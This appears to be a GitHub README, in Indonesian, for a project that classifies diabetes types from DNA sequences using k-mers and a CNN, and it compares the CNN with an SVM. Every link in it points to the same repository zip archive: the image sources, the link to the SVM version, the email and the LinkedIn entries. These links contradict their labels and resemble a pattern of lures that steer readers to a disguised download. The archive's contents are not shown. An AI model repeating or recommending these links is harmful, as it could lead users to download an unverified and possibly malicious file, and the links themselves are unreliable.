# 🧬 Klasifikasi Penderita Diabetes Berdasarkan Sekuens DNA Menggunakan Deep Learning (CNN)

## 📌 Deskripsi Proyek

Proyek ini bertujuan untuk mengklasifikasikan penderita **Diabetes Mellitus Tipe 1 (DMT1)**, **Tipe 2 (DMT2)**, dan **Non-Diabetes (NON-DM)** menggunakan **sekuens DNA manusia**. Model deep learning yang digunakan adalah **Convolutional Neural Network (CNN)** dengan pendekatan berbasis **k-mers** untuk representasi data.

---

## 📦 Dataset

- Jumlah data per kelas:
  - DMT1: 989 sekuens
  - DMT2: 989 sekuens
  - NON-DM: 989 sekuens
- Total: **2.967 sekuens DNA**
- Dataset telah **dibersihkan dan diseimbangkan** untuk memastikan kualitas data yang baik.

---

## ⚙️ Alur Proses

### 1. 🔍 Preprocessing Data
Proses preprocessing dilakukan untuk memastikan kualitas dan representasi data terbaik:

#### a. Pembersihan Data
- Menghapus spasi (whitespace)
- Menghapus sekuens dengan nukleotida tidak valid seperti `N`
- Menghapus sekuens duplikat

#### b. Transformasi Data
- Menggunakan metode **k-mers** (panjang 3-6) untuk mengubah sekuens DNA menjadi rangkaian token.
- Menggunakan **Tokenizer** untuk merepresentasikan setiap k-mer sebagai angka unik.

#### c. Oversampling
- Menggunakan **SMOTE (Synthetic Minority Over-sampling Technique)** untuk menyeimbangkan jumlah sampel antar kelas.

---

### 2. 📊 Eksplorasi Data
Visualisasi kata (k-mers) yang paling sering muncul dilakukan menggunakan **Wordcloud**.

<p align="center">
  <img src="https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip" width="500"/>
</p>

---

### 3. 🧠 Model Deep Learning (CNN)

#### 🔧 Eksperimen Arsitektur
- Percobaan dengan **2, 3, dan 4 layer CNN**
- Aktivasi: **ReLU**
- Pooling: **MaxPooling**
- Regularisasi: **Dropout**
- Output: **Softmax untuk klasifikasi 3 kelas**

#### 📐 Arsitektur Terbaik
- **2-layer CNN**
- Input dari hasil tokenisasi 3-mers
- Performa paling optimal dengan training yang stabil

---

## 🎯 Evaluasi Model

- **Akurasi terbaik: ~84%** pada kombinasi:
  - k-mers: **3**
  - Model: **2-layer CNN**
- Grafik evaluasi menunjukkan **train loss dan validation loss selaras**, menandakan **tidak overfitting**.

<p align="center">
  <img src="https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip" width="500"/>
</p>

---

## 🔍 Insight Penting

Meskipun pendekatan Deep Learning semakin populer, hasil eksperimen menunjukkan bahwa model **Support Vector Machine (SVM)** dengan representasi **4-mers** dan kernel **RBF (C = 10)** mampu memberikan **akurasi tertinggi sebesar 96%**.

Sebaliknya, model Deep Learning yang diuji seperti **CNN** hanya mencapai akurasi maksimal sekitar **84%**.

<p align="center">
  <img src="images/Akurasi https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip" width="500"/>
</p>

---

## 🚀 Teknologi yang Digunakan

- Python
- TensorFlow / Keras
- Pandas, NumPy
- Matplotlib, Seaborn
- Scikit-learn
- imbalanced-learn (SMOTE)

---

## 📌 Catatan

- Lihat juga versi Machine Learning (SVM) dengan akurasi lebih tinggi di:  
👉 [Klasifikasi DNA dengan SVM][(https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip)](https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip)


## 👤 Kontributor

**Nama:** _M. Wildan Nuril Akmal 

**Minat:** Data Science, Deep Learning bioinformatika  


## 📬 Kontak

Ingin berdiskusi lebih lanjut atau membutuhkan file csv nya?

- 📧 Email: [https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip]  
- 💼 LinkedIn: [https://raw.githubusercontent.com/wheldnz/DeepLearning-Klasifikasi-Diabetes-/main/images/DeepLearning-Klasifikasi-Diabetes--1.4.zip]
